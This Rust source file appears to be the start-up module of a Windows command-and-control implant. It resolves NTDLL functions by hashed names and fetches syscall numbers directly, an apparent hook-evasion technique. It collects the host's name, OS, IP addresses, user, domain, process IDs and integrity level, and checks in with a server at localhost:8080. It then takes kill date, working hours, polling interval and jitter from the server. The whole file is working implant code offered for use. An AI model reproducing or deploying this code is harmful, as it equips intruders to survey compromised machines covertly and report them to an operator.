use core::ffi::c_void;
use libc_print::{libc_eprintln, libc_println};
use mod_agentcore::{instance, instance_mut, Instance, INSTANCE};

use mod_hhtgates::get_syscall_number;
use mod_protocol_json::protocol::JsonProtocol;

use mod_win32::{
    ldr::{ldr_function_addr, ldr_module_peb, nt_current_teb},
    nt_get_adapters_info::get_adapters_info,
    nt_get_computer_name_ex::{get_computer_name_ex, ComputerNameFormat},
    nt_peb::{get_os, get_os_version_info, get_process_name, get_user_domain, get_username},
    nt_ps_api::{get_pid_and_ppid, nt_get_integrity_level},
};

use rs2_communication_protocol::{
    communication_structs::checkin::CheckinResponse, protocol::Protocol,
};
use rs2_communication_protocol::{
    communication_structs::checkin::{Checkin, PartialCheckin},
    metadata::Metadata,
    // sender::Sender,
};

use rs2_crypt::encryption_algorithm::ident_algorithm::IdentEncryptor;

/// Initializes the global instance by setting up necessary system call addresses and session data.
pub unsafe fn init_global_instance() {
    // Hashes and function addresses for various NTDLL functions
    const NTDLL_HASH: u32 = 0x1edab0ed;
    const NT_ALLOCATE_VIRTUAL_MEMORY: usize = 0xf783b8ec;
    const NT_FREE_VIRTUAL_MEMORY: usize = 0x2802c609;
    const NT_CLOSE: usize = 0x40d6e69d;
    const NT_OPEN_KEY: usize = 0x7682ed42;
    const NT_QUERY_VALUE_KEY: usize = 0x85967123;
    const NT_ENUMERATE_KEY: usize = 0x4d8a8976;
    const NT_QUERY_INFORMATION_PROCESS: usize = 0x8cdc5dc2;
    const NT_QUERY_INFORMATION_TOKEN: usize = 0xf371fe4;
    const NT_OPEN_PROCESS_TOKEN: usize = 0x350dca99;

    let mut instance = Instance::new();
    instance.teb = nt_current_teb();

    // Resolve NTDLL functions
    instance.ntdll.module_base = ldr_module_peb(NTDLL_HASH);

    // NtAllocateVirtualMemory
    instance.ntdll.nt_allocate_virtual_memory.syscall.address =
        ldr_function_addr(instance.ntdll.module_base, NT_ALLOCATE_VIRTUAL_MEMORY);
    instance.ntdll.nt_allocate_virtual_memory.syscall.number =
        get_syscall_number(instance.ntdll.nt_allocate_virtual_memory.syscall.address);

    // NtFreeVirtualMemory
    instance.ntdll.nt_free_virtual_memory.syscall.address =
        ldr_function_addr(instance.ntdll.module_base, NT_FREE_VIRTUAL_MEMORY);
    instance.ntdll.nt_free_virtual_memory.syscall.number =
        get_syscall_number(instance.ntdll.nt_free_virtual_memory.syscall.address);

    // NtClose
    instance.ntdll.nt_close.syscall.address =
        ldr_function_addr(instance.ntdll.module_base, NT_CLOSE);
    instance.ntdll.nt_close.syscall.number =
        get_syscall_number(instance.ntdll.nt_close.syscall.address);

    // NtOpenKey
    instance.ntdll.nt_open_key.syscall.address =
        ldr_function_addr(instance.ntdll.module_base, NT_OPEN_KEY);
    instance.ntdll.nt_open_key.syscall.number =
        get_syscall_number(instance.ntdll.nt_open_key.syscall.address);

    // NtQueryValueKey
    instance.ntdll.nt_query_value_key.syscall.address =
        ldr_function_addr(instance.ntdll.module_base, NT_QUERY_VALUE_KEY);
    instance.ntdll.nt_query_value_key.syscall.number =
        get_syscall_number(instance.ntdll.nt_query_value_key.syscall.address);

    // NtEnumerateKey
    instance.ntdll.nt_enumerate_key.syscall.address =
        ldr_function_addr(instance.ntdll.module_base, NT_ENUMERATE_KEY);
    instance.ntdll.nt_enumerate_key.syscall.number =
        get_syscall_number(instance.ntdll.nt_enumerate_key.syscall.address);

    // NtQueryInformationProccess
    instance.ntdll.nt_query_information_process.syscall.address =
        ldr_function_addr(instance.ntdll.module_base, NT_QUERY_INFORMATION_PROCESS);
    instance.ntdll.nt_query_information_process.syscall.number =
        get_syscall_number(instance.ntdll.nt_query_information_process.syscall.address);

    // NtOpenProcessToken
    instance.ntdll.nt_open_process_token.syscall.address =
        ldr_function_addr(instance.ntdll.module_base, NT_OPEN_PROCESS_TOKEN);
    instance.ntdll.nt_open_process_token.syscall.number =
        get_syscall_number(instance.ntdll.nt_open_process_token.syscall.address);

    // NtQueryInformationToken
    instance.ntdll.nt_query_information_token.syscall.address =
        ldr_function_addr(instance.ntdll.module_base, NT_QUERY_INFORMATION_TOKEN);
    instance.ntdll.nt_query_information_token.syscall.number =
        get_syscall_number(instance.ntdll.nt_query_information_token.syscall.address);

    // Init Session Data
    instance.session.connected = false;
    instance.session.pid = instance.teb.as_ref().unwrap().client_id.unique_process as i64;
    instance.session.tid = instance.teb.as_ref().unwrap().client_id.unique_thread as i64;

    // Init Config Data
    instance.config.polling_interval = 15;
    instance.config.polling_jitter = 10;

    *INSTANCE.lock().get() = Some(instance);
}

/// Gathers and initializes metadata such as computer name, OS info, IP addresses, etc.
pub fn init_checkin_data() {
    unsafe {
        // Get the computer name in DNS Hostname format
        let mut buffer = Vec::new();
        let mut size: u32 = 0;
        let success = get_computer_name_ex(
            ComputerNameFormat::ComputerNameDnsHostname,
            &mut buffer,
            &mut size,
        );

        let mut hostname = String::new();
        if success {
            // Convert the computer name to a String
            hostname = String::from_utf16_lossy(&buffer)
                .trim_end_matches('\0')
                .to_string();
        }

        // Get the operating system information
        let os_info_peb = get_os();
        let get_os_version_info_result = get_os_version_info();
        let mut operating_system = String::new();
        if get_os_version_info_result.is_ok() {
            let os_version_info = get_os_version_info_result.unwrap();

            // Construct the operating system information string
            operating_system.push_str(&format!(
                "{} {}.{}.{} (Platform ID: {})",
                os_info_peb,
                os_version_info.dw_major_version,
                os_version_info.dw_minor_version,
                os_version_info.dw_build_number,
                os_version_info.dw_platform_id,
            ));
        }

        // Get network adapters information
        let ip_addresses = get_adapters_info();

        // Get the process ID and parent process ID
        let (pid, ppid) = get_pid_and_ppid();

        // Get the integrity level of the process
        let process_handle = -1isize as _;
        let rid = nt_get_integrity_level(process_handle);

        // Create a Checkin object with the gathered metadata
        let mut checkin = Box::new(Checkin::new(PartialCheckin {
            operative_system: operating_system,
            hostname: hostname,
            domain: get_user_domain(),
            username: get_username(),
            ips: ip_addresses.unwrap(),
            process_id: pid as i64,
            parent_process_id: ppid as i64,
            process_name: get_process_name(),
            integrity_level: rid,
        }));

        // Add metadata to the Checkin object
        let metadata = Metadata {
            request_id: "an3a8hlnrr4638d30yef0oz5sncjdx5v".to_string(),
            command_id: "an3a8hlnrr4638d30yef0oz5sncjdx5w".to_string(),
            agent_id: "an3a8hlnrr4638d30yef0oz5sncjdx5x".to_string(),
            path: None,
        };

        checkin.with_metadata(metadata);

        // Set the Checkin data in the global instance
        instance_mut().set_checkin_data(Box::into_raw(checkin) as *mut c_void);
    }
}

/// Initializes the communication protocol and attempts to connect to the server.
pub async fn init_protocol() {
    #[cfg(feature = "protocol-json")]
    {
        let boxed_encryptor = Box::new(IdentEncryptor);
        let boxed_protocol: Box<JsonProtocol<IdentEncryptor>> =
            Box::new(JsonProtocol::new("http://localhost:8080".to_string()));

        unsafe {
            instance_mut().session.encryptor_ptr = Box::into_raw(boxed_encryptor) as *mut c_void;
            instance_mut().session.protocol_ptr = Box::into_raw(boxed_protocol) as *mut c_void;
        }

        unsafe {
            let encryptor = encryptor_from_raw(instance().session.encryptor_ptr);

            let protocol = protocol_from_raw(instance().session.protocol_ptr);

            // Check if the Checkin data is available in the global instance
            if let Some(checkin_ptr) = instance().pcheckindata.as_mut() {
                // Convert the raw pointer to a mutable reference to Checkin
                let checkin_data = checkin_from_raw(checkin_ptr);

                // Set the protocol to checkin mode
                // protocol.set_is_checkin(true);

                // Attempt to write the Checkin data using the protocol
                let result = protocol
                    .write(checkin_data.clone(), Some(encryptor.clone()))
                    .await;

                if result.is_ok() {
                    // If successful, mark the session as connected
                    instance_mut().session.connected = true;

                    let checkin_response: Result<CheckinResponse, anyhow::Error> =
                        protocol.read(result.unwrap(), Some(encryptor.clone()));

                    if checkin_response.is_ok() {
                        let checkin_response_data = checkin_response.unwrap();

                        instance_mut().config.id = checkin_response_data.id;
                        instance_mut().config.kill_date = checkin_response_data.kill_date;
                        instance_mut().config.working_hours = checkin_response_data.working_hours;
                        instance_mut().config.polling_interval =
                            checkin_response_data.polling_interval;
                        instance_mut().config.polling_jitter = checkin_response_data.polling_jitter;

                        libc_println!("Interval: {}", instance().config.polling_interval);
                    } else {
                        libc_eprintln!(
                            "Checkin Response Error: {}",
                            checkin_response.err().unwrap()
                        );
                    }
                } else {
                    libc_eprintln!("Error: {}", result.err().unwrap());
                }
            } else {
                // Handle error if Checkin data is null (currently commented out)
                libc_eprintln!("Error: Checkin data is null");
            }
        }
    }
}

/// Function to retrieve a mutable reference to a Checkin struct from a raw pointer.
pub unsafe fn checkin_from_raw(ptr: *mut c_void) -> &'static mut Checkin {
    &mut *(ptr as *mut Checkin)
}

#[cfg(feature = "protocol-json")]
/// Function to retrieve a mutable reference to a IdentEncryptor struct from a raw pointer.
pub unsafe fn encryptor_from_raw(ptr: *mut c_void) -> &'static mut IdentEncryptor {
    &mut *(ptr as *mut IdentEncryptor)
}

#[cfg(feature = "protocol-json")]
/// Function to retrieve a mutable reference to a JsonProtocl<IdentEncryptor> struct from a raw pointer.
pub unsafe fn protocol_from_raw(ptr: *mut c_void) -> &'static mut JsonProtocol<IdentEncryptor> {
    &mut *(ptr as *mut JsonProtocol<IdentEncryptor>)
}
